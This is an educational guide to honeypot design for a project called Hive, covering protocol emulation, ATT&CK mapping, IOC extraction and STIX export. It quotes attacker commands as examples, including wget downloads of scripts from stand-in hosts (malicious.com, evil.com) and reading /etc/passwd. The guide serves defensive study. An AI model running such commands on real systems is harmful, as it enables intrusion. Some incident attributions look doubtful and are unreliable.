# Security Concepts

## Honeypot Theory

A honeypot is a deliberately exposed system designed to attract attackers. Unlike production systems that try to keep intruders out, honeypots welcome them in and record everything they do. This creates a unique advantage: every interaction is suspicious. There are no false positives from legitimate users because legitimate users should never touch a honeypot.

Honeypots exist on a spectrum of interaction depth:

**Low interaction** honeypots simulate just enough of a service to log connection attempts. Think of a TCP listener that accepts SSH connections, records the client version string, and immediately disconnects. Tools like Honeyd and HoneyDrive work this way. They catch scanning and basic brute force attempts but an attacker who gets past the initial handshake will notice something is wrong.

**Medium interaction** honeypots implement enough protocol logic to sustain a conversation. An SSH honeypot accepts any password, presents a fake shell prompt, and responds to basic commands. This is what Hive implements. Attackers can run commands, download tools, and attempt lateral movement while the honeypot records every keystroke.

**High interaction** honeypots are actual systems, often VMs or containers, that run real operating systems with real vulnerabilities. Defenders instrument them with monitoring and let attackers fully compromise them. T-Pot by Deutsche Telekom uses Docker containers running real services to achieve this.

### Classification by Purpose

**Research honeypots** are deployed by security teams to study attack trends. The SANS Internet Storm Center runs a global network of sensors that feeds data into their daily reports. These honeypots aim to collect as much data as possible.

**Production honeypots** sit alongside real servers in a corporate network. Their goal is detection, not research. When something connects to a fake database server that nobody should know exists, it triggers an alert. Thinkst Canaries commercialized this concept.

## Protocol Emulation

Each protocol Hive simulates has specific elements that must be realistic enough to fool automated tools.

### SSH (RFC 4253)

The SSH handshake starts with both sides exchanging version strings. The server sends something like `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5`. Automated tools check this string to determine what exploits to try. Hive uses a realistic Ubuntu OpenSSH banner rather than something obviously fake.

After the version exchange, the protocol negotiates key exchange algorithms, generates session keys, and handles authentication. The critical decision is authentication policy: Hive accepts all passwords and records the credentials. This is how Cowrie and other SSH honeypots work. In the 2019 study by Wagener et al., they found that 78% of SSH brute force bots stop after a successful login, run a small set of reconnaissance commands, then disconnect. The remaining 22% download additional tools, typically cryptocurrency miners.

### MySQL Wire Protocol

MySQL uses a binary protocol with packet framing. The server initiates with a Greeting packet containing the server version, a connection ID, and an authentication salt. Hive implements just enough of this handshake to capture credentials. When attackers attempt SQL queries, the honeypot returns plausible responses (server version, database lists) to keep the session alive.

The MySQL protocol is particularly interesting because botnets like MiraiSQL specifically target exposed MySQL servers. In 2022, Aqua Security documented a campaign that scanned for MySQL servers, brute forced credentials, then used `SELECT ... INTO OUTFILE` to write web shells.

### SMB Negotiate

SMB is the most complex protocol Hive touches, and intentionally the simplest implementation. A full SMB2 session requires handling 15+ message types. Hive only implements the negotiate phase: it reads the NetBIOS frame, detects whether the client speaks SMB1 or SMB2, returns a negotiate response, and closes. This is sufficient to detect scanning tools like nmap's smb-enum scripts and EternalBlue scanners, which was the exploit used in the 2017 WannaCry ransomware attack that hit over 200,000 systems across 150 countries.

## MITRE ATT&CK Mapping

The MITRE ATT&CK framework catalogs adversary tactics, techniques, and procedures (TTPs) observed in real-world attacks. Tactics represent the "why" (what the attacker is trying to achieve) and techniques represent the "how."

Hive detects techniques from several tactics:

**Reconnaissance (TA0043)**: Port scanning (T1595) and vulnerability scanning (T1595.002) are detected when a single IP connects to multiple honeypot services within a short window.

**Credential Access (TA0006)**: Brute force attacks (T1110) are detected by counting authentication attempts per IP. Five or more login attempts within five minutes from the same source triggers a T1110 detection. This threshold comes from analysis of Cowrie honeypot logs where legitimate SSH users average 1.2 attempts per session while brute force tools average 20-50 per minute.

**Execution (TA0002)**: When an attacker runs commands in the SSH shell, each command is classified. Running `uname -a` or `cat /proc/cpuinfo` maps to System Information Discovery (T1082). Running `wget` or `curl` to download tools maps to Ingress Tool Transfer (T1105). Running `crontab` maps to Scheduled Task/Job: Cron (T1053.003).

**Impact (TA0040)**: Cryptocurrency mining commands (xmrig, stratum+tcp, cryptonight) map to Resource Hijacking (T1496). According to the 2023 Trend Micro report, crypto mining is the most common post-exploitation activity observed on compromised Linux servers, found in 42% of incidents.

## Indicator of Compromise (IOC) Extraction

An IOC is any artifact observed during an attack that can be used for detection. Hive extracts several IOC types:

**IP addresses**: Every source IP connecting to a honeypot is an IOC. Private/loopback addresses are filtered out. IPv4 and IPv6 are tracked separately with STIX indicator patterns (`[ipv4-addr:value = '..']`).

**URLs**: Commands like `wget http://malicious.com/payload.sh` contain URLs that can be blocklisted. The regex pattern pulls URLs from command strings, HTTP request bodies, and FTP file transfer paths.

**Tool signatures**: SSH client version strings and HTTP user-agent headers reveal the attacker's tooling. Hydra, Medusa, and ncrack each have distinct signatures. Identifying the tool family helps correlate attacks from the same campaign even when source IPs differ.

**Credentials**: Captured username/password pairs reveal which credential lists are in active use by botnets. The most common SSH credentials in 2024 honeypot data were root/admin, root/password, and admin/admin, according to SANS ISC reports.

## Threat Intelligence Standards

### STIX 2.1

Structured Threat Information eXpression (STIX) is the standard format for sharing cyber threat intelligence. Hive exports IOCs as STIX 2.1 bundles containing Indicator Structured Domain Objects (SDOs). Each indicator includes a STIX pattern expression, confidence score, valid-from timestamp, and labels.

Platforms like MISP, OpenCTI, and TheHive can directly ingest STIX bundles. This means honeypot data can automatically feed into an organization's threat intelligence pipeline without manual processing.

### Firewall Blocklists

For immediate defensive action, Hive generates IP blocklists in formats directly consumable by common infrastructure: iptables rules, nginx deny directives, plain text (one IP per line), and CSV with metadata. A SOC team can export a blocklist from the dashboard and apply it to perimeter firewalls within minutes of observing an attack.

## Real World Incidents

**2017 WannaCry**: Honeypots running on port 445 (SMB) were among the first to detect the EternalBlue-based worm spreading across the internet. Researchers at MalwareTech used honeypot data to identify the kill switch domain, which stopped the worm from spreading further.

**2021 Log4Shell (CVE-2021-44228)**: Within hours of disclosure, honeypots detected mass scanning for the Log4j vulnerability across HTTP, LDAP, and other protocols. GreyNoise reported their honeypot network saw exploitation attempts from over 1,400 unique IPs within the first 24 hours.

**2023 MOVEit Transfer (CVE-2023-34362)**: Security researchers set up HTTP honeypots mimicking MOVEit Transfer login pages. They captured the exact SQL injection payload used by the Cl0p ransomware group, which helped organizations determine if they had been compromised before the vulnerability was publicly known.

## Testing Your Understanding

1. Why does a medium-interaction SSH honeypot accept any password? What would change if it only accepted specific credentials?
2. An attacker connects to the SSH honeypot, runs `id`, `cat /etc/passwd`, `wget http://evil.com/bot.sh`, and `crontab -e`. Which MITRE ATT&CK techniques does this sequence represent?
3. Why is the SMB implementation limited to negotiate-only? What additional attack data would a full SMB2 session implementation capture?

## Further Reading

**Essential:**
- MITRE ATT&CK for Enterprise: https://attack.mitre.org/
- STIX 2.1 Specification: https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html
- Cowrie SSH/Telnet Honeypot: https://github.com/cowrie/cowrie

**Deep Dive:**
- "Know Your Enemy" series by The Honeynet Project
- RFC 4253 (SSH Transport Layer) and RFC 4252 (SSH Authentication)
- T-Pot multi-honeypot platform by Deutsche Telekom Security
